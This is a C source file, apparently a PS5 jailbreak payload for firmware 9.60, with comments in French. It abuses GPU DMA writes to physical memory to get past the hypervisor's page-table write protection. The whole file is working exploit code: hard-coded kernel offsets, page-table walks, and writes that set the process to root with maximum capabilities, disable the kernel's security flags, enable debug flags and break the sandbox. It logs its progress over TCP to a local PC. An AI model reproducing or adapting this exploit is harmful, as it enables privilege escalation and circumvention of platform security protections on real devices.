/* hv-unlock - cedsaill
 * PS5 FW 9.60 - Jailbreak + Debug Unlock via GPU DMA (bypass NPT/SVM)
 *
 * Technique : GPU RDNA2 IOMMU bypasse le CPU NPT write-protect sur kdata.
 * PM4 DMA_DATA ecrit directement en physical address sans passer par les
 * Nested Page Tables du hyperviseur AMD SVM.
 *
 * Ce que ca fait :
 *   1. Jailbreak  : uid=0, caps=MAX, sceAuthId=system core
 *   2. Unlock     : security_flags=0, qa_flags=0xFF (debug mode)
 *   3. Root escape : fd_rdir + fd_jdir -> rootvnode (sandbox break)
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <ps5/kernel.h>

/* ---- config --------------------------------------------------------------- */
/* PC cible pour les logs TCP - remplacer par votre IP */
#define PC_IP    "192.168.1.100"
#define PC_PORT   9999

/* ---- FW 9.60 offsets ------------------------------------------------------ */
#define OFF_ALLPROC             0x033F5D50ULL
#define OFF_SECURITY_FLAGS      0x1A13064ULL
#define OFF_QA_FLAGS            0x1A13088ULL
#define OFF_ROOT_VNODE          0x3C7B510ULL

/* struct proc */
#define PROC_PID                0x0bcULL
#define PROC_UCRED              0x040ULL
#define PROC_FD                 0x048ULL

/* struct ucred */
#define UCRED_UID               0x004ULL
#define UCRED_RUID              0x008ULL
#define UCRED_SVUID             0x00cULL
#define UCRED_RGID              0x014ULL
#define UCRED_SVGID             0x018ULL
#define UCRED_SCE_AUTHID        0x058ULL
#define UCRED_SCE_CAPS0         0x060ULL
#define UCRED_SCE_CAPS1         0x068ULL
#define UCRED_SCE_ATTRS         0x080ULL

/* struct filedesc */
#define FD_RDIR                 0x010ULL
#define FD_JDIR                 0x018ULL

/* GPU struct offsets */
#define DATA_BASE_GVMSPACE      0x02D8A570ULL
#define SIZEOF_GVMSPACE         0x100ULL
#define GVMSPACE_PAGE_DIR_VA    0x38ULL
#define GVMSPACE_SIZE_OFF       0x10ULL
#define GVMSPACE_START_VA_OFF   0x08ULL
#define PROC_VM_SPACE_OFF       0x200ULL

/* GPU DMA */
#define GPU_DMEM_SIZE           (2 * 0x100000ULL)
#define GPU_SUBMIT_IOCTL        0xC0108102
#define PM4_TYPE3               3
#define PM4_SHADER_COMPUTE      1
#define PM4_OPCODE_DMA_DATA     0x50
#define GPU_PDE_ADDR_MASK       0x0000FFFFFFFFFFC0ULL
#define GPU_PDE_VALID_BIT       0
#define GPU_PDE_IS_PTE_BIT      54
#define GPU_PDE_TF_BIT          56
#define GPU_PDE_BLOCK_FRAG_BIT  59
#define PROT_GPU_READ           0x10
#define PROT_GPU_WRITE          0x20
#define MAP_NO_COALESCE         0x400000

/* CPU PTE */
#define PTE_PA_MASK             0x000FFFFFFFFFF000ULL
#define PTE_P_BIT               (1ULL<<0)
#define PTE_PS_BIT              (1ULL<<7)

/* ---- externes PS5 --------------------------------------------------------- */
extern int sceKernelAllocateMainDirectMemory(size_t, size_t, int, uint64_t *);
extern int sceKernelMapNamedDirectMemory(void **, size_t, int, int, uint64_t, size_t, const char *);

/* ---- TCP log -------------------------------------------------------------- */
static int g_sock = -1;
static void S(const char *s){ if(g_sock>=0) send(g_sock,s,strlen(s),MSG_NOSIGNAL); }
static void NL(void){ S("\n"); }
static void FL(void){ usleep(8000); }
static void X(uint64_t v){
    char b[19]; const char *h="0123456789abcdef";
    b[0]='0'; b[1]='x';
    for(int i=0;i<16;i++) b[2+i]=h[(v>>(60-i*4))&0xf];
    b[18]='\0'; S(b);
}
static void LOG(const char *tag, uint64_t v){ S(tag); X(v); NL(); FL(); }

/* ---- kernel primitives ---------------------------------------------------- */
static int      kco(uint64_t va, void *buf, size_t n){ return kernel_copyout((intptr_t)va,buf,n); }
static uint64_t kread64(uint64_t va){ uint64_t v=0; kco(va,&v,8); return v; }
static uint32_t kread32(uint64_t va){ uint32_t v=0; kco(va,&v,4); return v; }
static void     kwrite64(uint64_t va, uint64_t v){ kernel_copyin(&v,(intptr_t)va,8); }

static uint64_t g_cr3=0, g_dmap=0;

static int calc_dmap(void){
    intptr_t p=kernel_get_proc(getpid());
    if(!p) return -1;
    uint64_t vm=0;
    kco((uint64_t)p+KERNEL_OFFSET_PROC_P_VMSPACE,&vm,8);
    if(!vm) return -1;
    uint64_t pm=vm+KERNEL_OFFSET_VMSPACE_VM_PMAP;
    uint64_t p4=0,cr3=0;
    kco(pm+0x20,&p4,8); kco(pm+0x28,&cr3,8);
    if(!cr3||(cr3&0xFFF)) return -1;
    g_cr3=cr3; g_dmap=p4-cr3;
    return 0;
}

static uint64_t vtophys(uint64_t va){
    uint64_t t=g_cr3&PTE_PA_MASK;
    for(int lv=0;lv<4;lv++){
        uint64_t e=kread64(g_dmap+t+((va>>(39-lv*9))&0x1FF)*8);
        if(!(e&PTE_P_BIT)) return 0;
        if(lv==3) return (e&PTE_PA_MASK)|(va&0xFFF);
        if(lv==1&&(e&PTE_PS_BIT)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF);
        if(lv==2&&(e&PTE_PS_BIT)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);
        t=e&PTE_PA_MASK;
    }
    return 0;
}

/* ---- GPU ------------------------------------------------------------------ */
static inline uint64_t gpuf(uint64_t e, int bit, uint64_t mask){ return (e>>bit)&mask; }

static uint32_t find_vmid(void){
    intptr_t proc=kernel_get_proc(getpid());
    if(!proc) return 0;
    uint64_t vm=0;
    kco((uint64_t)proc+PROC_VM_SPACE_OFF,&vm,8);
    if(!vm) return 0;
    for(int i=0;i<8;i++){
        uint32_t v=kread32(vm+0x1D8+(uint64_t)(i*4));
        if(v>0&&v<=0x10) return v;
    }
    return 0;
}

static uint64_t gpu_pdb2(uint32_t vmid){
    uint64_t gvs=(uint64_t)(uintptr_t)KERNEL_ADDRESS_DATA_BASE
                 +DATA_BASE_GVMSPACE+(uint64_t)vmid*SIZEOF_GVMSPACE;
    return kread64(gvs+GVMSPACE_PAGE_DIR_VA);
}

static uint64_t gpu_rel(uint32_t vmid, uint64_t va){
    uint64_t gvs=(uint64_t)(uintptr_t)KERNEL_ADDRESS_DATA_BASE
                 +DATA_BASE_GVMSPACE+(uint64_t)vmid*SIZEOF_GVMSPACE;
    uint64_t st=kread64(gvs+GVMSPACE_START_VA_OFF);
    uint64_t sz=kread64(gvs+GVMSPACE_SIZE_OFF);
    if(va>=st&&va<st+sz) return va-st;
    return (uint64_t)-1;
}

static uint64_t gpu_walk(uint32_t vmid, uint64_t va, uint64_t *pgsz){
    uint64_t pdb2=gpu_pdb2(vmid);
    uint64_t ml4e=kread64(pdb2+((va>>39)&0x1FF)*8);
    if(!gpuf(ml4e,GPU_PDE_VALID_BIT,1)) return 0;
    uint64_t pdpe=kread64(g_dmap+(ml4e&GPU_PDE_ADDR_MASK)+((va>>30)&0x1FF)*8);
    if(!gpuf(pdpe,GPU_PDE_VALID_BIT,1)) return 0;
    uint64_t pde_va=g_dmap+(pdpe&GPU_PDE_ADDR_MASK)+((va>>21)&0x1FF)*8;
    uint64_t pde=kread64(pde_va);
    if(!gpuf(pde,GPU_PDE_VALID_BIT,1)) return 0;
    if(gpuf(pde,GPU_PDE_IS_PTE_BIT,1)){ *pgsz=0x200000; return pde_va; }
    uint64_t frag=gpuf(pde,GPU_PDE_BLOCK_FRAG_BIT,0x1F);
    uint64_t off=va&0x1FFFFF;
    uint64_t pt=pde&GPU_PDE_ADDR_MASK;
    if(frag==4){
        uint64_t pte=kread64(g_dmap+pt+(off>>16)*8);
        if(gpuf(pte,0,1)&&gpuf(pte,GPU_PDE_TF_BIT,1)){
            *pgsz=0x2000; return g_dmap+pt+((va&0xFFFF)>>13)*8;
        }
        *pgsz=0x10000; return g_dmap+pt+(off>>16)*8;
    }
    if(frag==1){ *pgsz=0x2000; return g_dmap+pt+((off>>13)*8); }
    *pgsz=0x10000; return g_dmap+pt+((off>>16)*8);
}

static uint64_t gpu_alloc(uint64_t size, int rw){
    uint64_t phys=0; void *va=NULL;
    int prot=PROT_READ|PROT_WRITE|PROT_GPU_READ;
    if(rw) prot|=PROT_GPU_WRITE;
    if(sceKernelAllocateMainDirectMemory((size_t)size,(size_t)size,1,&phys)) return 0;
    if(sceKernelMapNamedDirectMemory(&va,(size_t)size,prot,MAP_NO_COALESCE,phys,(size_t)size,"gpu")) return 0;
    return (uint64_t)(uintptr_t)va;
}

struct {
    int fd;
    uint64_t victim_va, xfer_va, cmd_va;
    uint64_t ptbe_va, real_pa, dmem_size;
} g_gpu = { .fd=-1 };

static int gpu_submit(uint64_t cmd_va, uint32_t bytes){
    uint64_t desc[2];
    desc[0]=((cmd_va&0xFFFFFFFFULL)<<32)|0xC0023F00ULL;
    desc[1]=(((uint64_t)(bytes>>2)&0xFFFFF)<<32)|((cmd_va>>32)&0xFFFF);
    uint64_t dv=g_gpu.cmd_va+0x1000;
    memcpy((void*)(uintptr_t)dv,desc,16);
    struct { uint32_t pipe_id,count; uint64_t ptr; } sub={0,1,dv};
    int r=ioctl(g_gpu.fd,GPU_SUBMIT_IOCTL,&sub);
    usleep(200000);
    return r;
}

static int gpu_write_pa(uint64_t pa, const void *buf, uint32_t size){
    uint64_t base=pa&~(g_gpu.dmem_size-1);
    uint64_t off=pa-base;
    if(off+size>g_gpu.dmem_size) return -1;
    int ro=PROT_READ|PROT_WRITE|PROT_GPU_READ;
    memcpy((void*)(uintptr_t)g_gpu.xfer_va,buf,size);
    mprotect((void*)(uintptr_t)g_gpu.victim_va,(size_t)g_gpu.dmem_size,ro);
    uint64_t cur=kread64(g_gpu.ptbe_va);
    uint64_t flags=cur&~GPU_PDE_ADDR_MASK;
    kwrite64(g_gpu.ptbe_va,flags|(base&GPU_PDE_ADDR_MASK));
    mprotect((void*)(uintptr_t)g_gpu.victim_va,(size_t)g_gpu.dmem_size,ro|PROT_GPU_WRITE);
    uint32_t pkt[7];
    uint32_t hdr=((PM4_TYPE3&3u)<<30)|(((6-1)&0x3FFFu)<<16)|((PM4_OPCODE_DMA_DATA&0xFF)<<8)|((PM4_SHADER_COMPUTE&1)<<1);
    uint32_t dhdr=(1u<<31)|(2u<<25)|(1u<<27)|(2u<<13)|(1u<<15);
    pkt[0]=hdr; pkt[1]=dhdr;
    pkt[2]=(uint32_t)(g_gpu.xfer_va&0xFFFFFFFF); pkt[3]=(uint32_t)(g_gpu.xfer_va>>32);
    pkt[4]=(uint32_t)((g_gpu.victim_va+off)&0xFFFFFFFF); pkt[5]=(uint32_t)((g_gpu.victim_va+off)>>32);
    pkt[6]=size&0x1FFFFF;
    memcpy((void*)(uintptr_t)g_gpu.cmd_va,pkt,28);
    int r=gpu_submit(g_gpu.cmd_va,28);
    kwrite64(g_gpu.ptbe_va,flags|(g_gpu.real_pa&GPU_PDE_ADDR_MASK));
    return r;
}

static int gpu_init(void){
    g_gpu.dmem_size=GPU_DMEM_SIZE;
    g_gpu.fd=open("/dev/gc",O_RDWR);
    if(g_gpu.fd<0){ S("ERR:gc\n"); return -1; }
    g_gpu.victim_va=gpu_alloc(GPU_DMEM_SIZE,1);
    g_gpu.xfer_va  =gpu_alloc(GPU_DMEM_SIZE,1);
    g_gpu.cmd_va   =gpu_alloc(GPU_DMEM_SIZE,1);
    if(!g_gpu.victim_va||!g_gpu.xfer_va||!g_gpu.cmd_va){ S("ERR:dmem\n"); return -1; }
    g_gpu.real_pa=vtophys(g_gpu.victim_va);
    if(!g_gpu.real_pa){ S("ERR:vpa\n"); return -1; }
    uint32_t vmid=find_vmid();
    if(!vmid){ S("ERR:vmid\n"); return -1; }
    uint64_t rel=gpu_rel(vmid,g_gpu.victim_va);
    if(rel==(uint64_t)-1){ S("ERR:rel\n"); return -1; }
    uint64_t pgsz=0;
    g_gpu.ptbe_va=gpu_walk(vmid,rel,&pgsz);
    if(!g_gpu.ptbe_va){ S("ERR:walk\n"); return -1; }
    mprotect((void*)(uintptr_t)g_gpu.victim_va,(size_t)GPU_DMEM_SIZE,PROT_READ|PROT_WRITE|PROT_GPU_READ);
    mprotect((void*)(uintptr_t)g_gpu.victim_va,(size_t)GPU_DMEM_SIZE,PROT_READ|PROT_WRITE|PROT_GPU_READ|PROT_GPU_WRITE);
    S("gpu_ok\n"); FL();
    return 0;
}

static void cache_evict(void){
    const size_t SZ=32U*1024U*1024U;
    volatile char *p=(volatile char*)mmap(NULL,SZ,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(p==MAP_FAILED) return;
    for(size_t i=0;i<SZ;i+=0x1000) p[i]=(char)i;
    volatile uint64_t s=0;
    for(size_t i=0;i<SZ;i+=64) s+=*(volatile uint64_t*)(p+i);
    (void)s; munmap((void*)p,SZ);
}

/* ========================================================================== */
int main(void){
    g_sock=socket(AF_INET,SOCK_STREAM,0);
    if(g_sock<0) return 1;
    int one=1;
    setsockopt(g_sock,IPPROTO_TCP,TCP_NODELAY,&one,sizeof(one));
    struct sockaddr_in sa; memset(&sa,0,sizeof(sa));
    sa.sin_family=AF_INET;
    sa.sin_port=__builtin_bswap16(PC_PORT);
    sa.sin_addr.s_addr=inet_addr(PC_IP);
    if(connect(g_sock,(struct sockaddr*)&sa,sizeof(sa))<0){ close(g_sock); return 1; }

    S("=== hv-unlock FW9.60 - cedsaill ===\n"); FL();

    /* dmap + primitives */
    if(calc_dmap()){ S("ERR:dmap\n"); FL(); goto done; }
    LOG("dmap=",g_dmap);

    uint64_t kbase=(uint64_t)(uintptr_t)KERNEL_ADDRESS_TEXT_BASE;
    LOG("kbase=",kbase);

    /* GPU DMA init */
    if(gpu_init()){ goto done; }

    /* Trouver notre proc via allproc */
    uint64_t my_proc=0;
    {
        int mypid=getpid();
        uint64_t pp=kread64(kbase+OFF_ALLPROC);
        int it=0;
        while(pp&&(pp>>48)==0xffffULL&&it<512){
            uint32_t pid=0; kco(pp+PROC_PID,&pid,4);
            if((int)pid==mypid){ my_proc=pp; break; }
            pp=kread64(pp); it++;
        }
    }
    if(!my_proc){ S("ERR:proc\n"); FL(); goto done; }
    LOG("proc=",my_proc);

    /* ucred */
    uint64_t ucred=kread64(my_proc+PROC_UCRED);
    if((ucred>>48)!=0xffffULL){ S("ERR:ucred\n"); FL(); goto done; }
    LOG("ucred=",ucred);

    /* ---- JAILBREAK : modifier ucred via GPU DMA ---- */
    S("jailbreak...\n"); FL();

    /* uid + ruid = 0 */
    { uint64_t z=0; gpu_write_pa(vtophys(ucred+UCRED_UID),&z,8); }

    /* svuid = 0, keep ngroups */
    { uint64_t q=kread64(ucred+UCRED_SVUID)&0xFFFFFFFF00000000ULL;
      gpu_write_pa(vtophys(ucred+UCRED_SVUID),&q,8); }

    /* rgid + svgid = 0 */
    { uint64_t z=0; gpu_write_pa(vtophys(ucred+UCRED_RGID),&z,8); }

    /* sceAuthId = system core */
    { uint64_t v=0x4800000000000007ULL; gpu_write_pa(vtophys(ucred+UCRED_SCE_AUTHID),&v,8); }

    /* sceCaps = MAX */
    { uint64_t v=0xFFFFFFFFFFFFFFFFULL;
      gpu_write_pa(vtophys(ucred+UCRED_SCE_CAPS0),&v,8);
      gpu_write_pa(vtophys(ucred+UCRED_SCE_CAPS1),&v,8); }

    /* sceAttrs = MAX */
    { uint64_t v=0xFFFFFFFFFFFFFFFFULL; gpu_write_pa(vtophys(ucred+UCRED_SCE_ATTRS),&v,8); }

    /* ---- UNLOCK : security_flags + qa_flags ---- */
    S("unlock...\n"); FL();

    /* security_flags (u32 @ kbase+0x1a13064, non-aligne sur 8)
     * On lit la qword @ kbase+0x1a13060, clear les bits 32..63 */
    {
        uint64_t va=kbase+OFF_SECURITY_FLAGS-4;
        uint64_t q=kread64(va)&0x00000000FFFFFFFFULL;
        gpu_write_pa(vtophys(va),&q,8);
    }

    /* qa_flags (u32 @ kbase+0x1a13088, aligne sur 8) = 0xFF */
    {
        uint64_t va=kbase+OFF_QA_FLAGS;
        uint64_t q=kread64(va)|0x000000FFULL;
        gpu_write_pa(vtophys(va),&q,8);
    }

    /* ---- ROOT ESCAPE : fd_rdir + fd_jdir = rootvnode ---- */
    S("root_escape...\n"); FL();

    uint64_t rootvnode=kread64(kbase+OFF_ROOT_VNODE);
    LOG("rootvnode=",rootvnode);

    if(rootvnode&&(rootvnode>>48)==0xffffULL){
        uint64_t p_fd=kread64(my_proc+PROC_FD);
        LOG("p_fd=",p_fd);
        if((p_fd>>48)==0xffffULL){
            gpu_write_pa(vtophys(p_fd+FD_RDIR),&rootvnode,8);
            gpu_write_pa(vtophys(p_fd+FD_JDIR),&rootvnode,8);
            S("root_escape_ok\n"); FL();
        }
    }

    /* Cache eviction */
    cache_evict();
    S("evict_ok\n"); FL();

    /* Verification */
    {
        uint64_t uid_check=kread64(ucred+UCRED_UID);
        uint64_t auth_check=kread64(ucred+UCRED_SCE_AUTHID);
        LOG("uid_dmap=",uid_check);
        LOG("auth=",auth_check);
        int uid=getuid();
        LOG("getuid=", (uint64_t)(unsigned)uid);
        if(uid==0&&(uid_check&0xFFFFFFFFULL)==0)
            S("*** HV_UNLOCK_OK ***\n");
        else
            S("partial\n");
        FL();
    }

done:
    if(g_gpu.fd>=0) close(g_gpu.fd);
    S("--- DONE ---\n"); FL();
    if(g_sock>=0) close(g_sock);
    return 0;
}
